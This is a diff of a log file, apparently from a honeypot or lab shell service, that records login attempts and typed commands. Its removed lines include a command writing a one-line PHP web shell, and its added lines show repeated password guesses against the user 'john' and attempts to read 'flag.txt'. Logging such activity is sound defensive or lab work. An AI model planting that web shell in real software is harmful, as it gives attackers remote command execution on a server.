@@ -1,18 +1,15 @@
-Client 127.0.0.1 attempted connection with username: username, password: password
-Client 127.0.0.1 attempted connection with username: username, password: password
-[2025-04-25 09:38:16] [127.0.0.1] [USERNAME: ] [CMD] ls
-[2025-04-25 09:38:21] [127.0.0.1] [USERNAME: ] [CMD] cat flag.txt
-Client 127.0.0.1 attempted connection with username: username, password: password
-[2025-04-25 09:39:33] [127.0.0.1] [USERNAME: ] [CMD] whoami
-[2025-04-25 09:39:44] [127.0.0.1] [USERNAME: ] [CMD] ls
-[2025-04-25 09:39:46] [127.0.0.1] [USERNAME: ] [CMD] pwd
-Client 127.0.0.1 attempted connection with username: username, password: password
-[2025-04-25 10:11:03] [127.0.0.1] [USERNAME: username] [CMD] ls
-[2025-04-25 10:11:13] [127.0.0.1] [USERNAME: username] [CMD] nano
-[2025-04-25 10:11:24] [127.0.0.1] [USERNAME: username] [CMD] nano test.txt
-[2025-04-25 10:11:32] [127.0.0.1] [USERNAME: username] [CMD] echo hello
-[2025-04-25 10:11:48] [127.0.0.1] [USERNAME: username] [CMD] history
-[2025-04-25 10:12:40] [127.0.0.1] [USERNAME: username] [CMD] echo "<?php system(\$_GET[\'cmd\']); ?>" > shell.php
-[2025-04-25 10:12:42] [127.0.0.1] [USERNAME: username] [CMD] ls
-[2025-04-25 10:12:46] [127.0.0.1] [USERNAME: username] [CMD] cat flag.txt
-[2025-04-25 10:12:58] [127.0.0.1] [USERNAME: username] [CMD] env
+Client 192.168.134.130 attempted connection with username: john, password: P@ssw0rd
+[2025-04-25 10:59:11] [192.168.134.130] [USERNAME: None] [CMD] rm
+[2025-04-25 10:59:13] [192.168.134.130] [USERNAME: None] [CMD] rm /r
+[2025-04-25 10:59:17] [192.168.134.130] [USERNAME: None] [CMD] cat flag.txt
+Client 192.168.134.139 attempted connection with username: john, password: password
+Client 192.168.134.139 attempted connection with username: john, password: P@ssw0rd
+Client 192.168.134.139 attempted connection with username: john, password: afjwqkfjwq
+Client 192.168.134.139 attempted connection with username: john, password: fj1fi1jrf
+Client 192.168.134.139 attempted connection with username: john, password: fiqwjiejf
+Client 192.168.134.139 attempted connection with username: john, password: wjeifjwqiefj
+Client 192.168.134.139 attempted connection with username: john, password: qwjeifjiwqjef
+Client 192.168.134.139 attempted connection with username: john, password: qwjeifjwqiefj
+Client 192.168.134.139 attempted connection with username: john, password: wqjefijwqeifj
+Client 192.168.134.139 attempted connection with username: john, password: 12312441
+Client 192.168.134.139 attempted connection with username: john, password: ifjiewjfi
